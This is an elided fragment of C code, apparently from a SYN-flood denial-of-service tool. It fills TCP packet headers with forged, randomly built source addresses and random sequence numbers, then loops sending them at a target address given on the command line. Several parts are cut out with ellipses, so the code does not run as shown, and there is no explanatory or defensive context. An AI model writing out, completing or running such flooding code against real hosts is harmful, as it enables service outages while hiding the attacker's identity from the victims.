...
main(int argc, char * argv[]){ 
   ...
   struct packet synp; 
   bzero(&synp,sizeof(struct packet)); 
   ...
   int counter = 0; 
      ...
      while(counter != packets){ 
       ...
       strcat(a1s,a4s); 
          ...
          synp.sport           = htons(srcp);          
          synp.source            = inet_addr (a1s);      
          synp.seq               = random(); 
          synp.ack_seq           = random(); 
          
          synp.id                = htons(1+255*((random()%256)|0xFF));   
      
       synp.dest = inet_addr (argv[1]); 
          
       sin.sin_family = AF_INET;         
       sin.sin_port = synp.dport;          
       sin.sin_addr.s_addr = synp.dest;      
